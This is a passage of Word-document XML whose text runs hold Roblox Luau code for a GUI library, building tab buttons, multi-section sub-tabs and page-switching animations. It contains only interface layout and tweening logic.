        <w:t xml:space="preserve">            } </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "tab_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library.cache;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 196, 0, 56);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -216, 1, -101);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-- Tab buttons </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(255, 255, 255);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self.items[ "button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutoButtonColor = false;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Size = dim2(1, 0, 0, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(29, 29, 29)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"icon" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ImageColor3 = rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Image = cfg.icon;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 10, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 22, 0, 22);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 library:apply_theme(items[ "icon" ], "accent", "ImageColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "name" ]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rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 40,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"name" ];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"button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 7)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rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Multi Sections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "multi_section_button_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library.cache;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Visible = false;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"multi_section_button_holder"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Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FillDirection = Enum.FillDirection.Horizontal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PaddingTop = dim(0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingBottom = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "multi_section_button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingRight = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });                        </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, section in cfg.tabs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local data = {items = {}} </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local multi_items = data.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            -- Button</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                multi_items[ "button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = items[ "multi_section_button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(0, 0, 0, 39);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ClipsDescendants = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AutomaticSize = Enum.AutomaticSize.X;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = rgb(25, 25, 29)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multi_items[ "name" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextColor3 = rgb(62, 62, 63);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Text = section;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = rgb(255, 255, 255)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"UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "name" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingRight = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingLeft = dim(0, 5)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multi_items[ "accent" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AnchorPoint = vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Position = dim2(0, 10, 1, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(1, -20, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                }); library:apply_theme(multi_items[ "accent" ], "accent", "BackgroundColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "accent" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    CornerRadius = dim(0, 999)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"UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingRight = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingLeft = dim(0, 10)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"UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    CornerRadius = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                }); </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            -- Tab </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                multi_items[ "tab" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = library.cache;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(1, -20, 1, -20);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = rgb(255, 255, 255)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"UIListLayout" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    FillDirection = Enum.FillDirection.Vertical;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    HorizontalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "tab" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Padding = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    SortOrder = Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    VerticalFlex = Enum.UIFlexAlignment.Fill</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:create( "UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingTop = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingBottom = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "tab" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingRight = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingLeft = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.text = multi_items[ "name" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.accent = multi_items[ "accent" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.button = multi_items[ "button" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.page = multi_items[ "tab" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.parent = setmetatable(data, library):sub_tab({}).items[ "tab_parent" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        -- Old column code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        -- data.left = multi_items[ "left" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        -- data.right = multi_items[ "right" ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>function data.open_page()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t xml:space="preserve">local page = cfg.current_multi; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if page and page.text ~= data.text then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                self.items[ "global_fade" ].BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(self.items[ "global_fade" ], {BackgroundTransparency = 1}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local old_size = page.page.Size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                page.page.Size = dim2(1, -20, 1, -20)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if page then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(page.text, {TextColor3 = rgb(62, 62, 63)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(page.accent, {BackgroundTransparency = 1})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(page.button, {BackgroundTransparency = 1})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                page.page.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                page.page.Parent = library[ "cache" ] </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.text, {TextColor3 = rgb(255, 255, 255)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.accent, {BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.button, {BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.page, {Size = dim2(1, 0, 1, 0)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            data.page.Visible = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            data.page.Parent = items["tab_holder"]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.current_multi = data</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:close_element()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>multi_items[ "button"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ab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t xml:space="preserve">data.open_page() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>cfg.pages[#cfg.pages + 1] = setmetatable(data, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.pages[1].open_page()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.open_tab() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local selected_tab = self.selected_tab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if selected_tab then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if selected_tab[ 4 ] ~= items[ "tab_holder" ] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        self.items[ "global_fade" ].BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(self.items[ "global_fade" ], {BackgroundTransparency = 1}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        selected_tab[ 4 ].Size = dim2(1, -216, 1, -101)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(selected_tab[ 1 ], {BackgroundTransparency = 1})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(selected_tab[ 2 ], {ImageColor3 = rgb(72, 72, 73)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(selected_tab[ 3 ], {TextColor3 = rgb(72, 72, 73)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 4 ].Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 4 ].Parent = library[ "cache" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 5 ].Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 5 ].Parent = library[ "cache" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "button" ], {BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "icon" ], {ImageColor3 = themes.preset.accent})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "name" ], {TextColor3 = rgb(255, 255, 255)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "tab_holder" ], {Size = dim2(1, -196, 1, -81)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "tab_holder" ].Visible = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "tab_holder" ].Parent = self.items[ "main" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "multi_section_button_holder" ].Visible = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "multi_section_button_holder" ].Parent = self.items[ "multi_holder" ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                self.selected_tab = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "icon" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "name" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "tab_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "multi_section_button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:close_element()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "button"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cfg.open_tab()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if not self.selected_tab then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open_tab(true) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return unpack(cfg.pages)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:seperator(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {items = {}, name = properties.Name or properties.name or "General"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
